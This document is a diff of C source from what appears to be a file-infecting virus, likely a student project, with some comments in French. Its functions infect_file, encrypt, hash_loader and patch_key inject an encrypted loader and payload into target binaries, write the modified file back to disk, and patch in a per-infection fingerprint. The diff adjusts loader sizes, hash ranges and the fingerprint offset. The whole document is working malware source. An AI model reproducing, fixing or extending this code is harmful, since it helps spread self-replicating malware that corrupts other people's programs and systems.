@@ -213,6 +213,7 @@ uint32_t    encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint)
 // 	dprintf(1, "%#x\n", key);
 //     key = KEY;
 	key += fingerprint;
+	ft_memcpy(info->file + info->offset_bis + /*D*/0xFB/*D`*/, &fingerprint, 4); //0xfb is pos of fingerprint sub in bis
 // 	ft_putnbr(fingerprint);
 // 	(void)fingerprint;
     int nb = 0;
@@ -239,12 +240,12 @@ uint32_t	hash_loader(t_info *info)
 	unsigned char	*str;
 
 	str = (unsigned char *)(info->text_begin + info->text_size);
-	size = 0x10; //a modifier taille du loader 0xc5
+	size = 0xc5; //a modifier taille du loader 0xc5 (0xca - 5)
 
 	size_t i = 0;
 	while (i < size)
 	{
-		if (i < 0x91 || i > 0x95) //a modifier debut et fin pos adresse apres pos_rdi dans loader
+		if (i < 0x9D || i > 0xa1) //a modifier debut et fin pos adresse apres pos_rdi dans loader
 				hash = ((hash << 5) + hash) + str[i];
 		i++;
 	}
@@ -253,7 +254,7 @@ uint32_t	hash_loader(t_info *info)
 
 
 	str = (unsigned char *)(info->file + info->offset_bis);
-	size = 0x10; // BIS _SIZE + PAYLOAD SIZE a modifier 0x1f4f
+	size = 0x29f0; // BIS _SIZE + PAYLOAD SIZE a modifier 0x1f4f
 	
 	i = 0;
 	while (i < size)
@@ -266,7 +267,7 @@ uint32_t	hash_loader(t_info *info)
 	return (hash);
 }
 
-void			patch_key(t_info *info, uint32_t key, uint32_t fingerprint)
+void			patch_key(t_info *info, uint32_t key)
 {
 	uint32_t val;
 	uint32_t hash;
@@ -278,8 +279,6 @@ void			patch_key(t_info *info, uint32_t key, uint32_t fingerprint)
 	ft_memcpy(info->file + info->offset_bis + /*C*/0x91/*C`*/, &val, 4); // 0x78 is addr of key in bis
 
 // 	(void)fingerprint;
-	val = fingerprint;
-	ft_memcpy(info->file + info->offset_bis + /*D*/0xFB/*D`*/, &val, 4); //0xfb is pos of fingerprint sub in bis
 
 
 }
@@ -326,7 +325,7 @@ static void		infect_file(char *path, t_fingerprint *fingerprint)
 		goto end_fct;
 	patch_addresses(&info);
 	inject_sign(&info, fingerprint);
-	patch_key(&info, encrypt(&info, info.file + info.offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint), fingerprint->fingerprint);
+	patch_key(&info, encrypt(&info, info.file + info.offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint));
 	ft_syswrite(info.fd, info.file, info.file_size);
 	end_fct:
 	ft_sysmunmap(info.file, info.file_size);
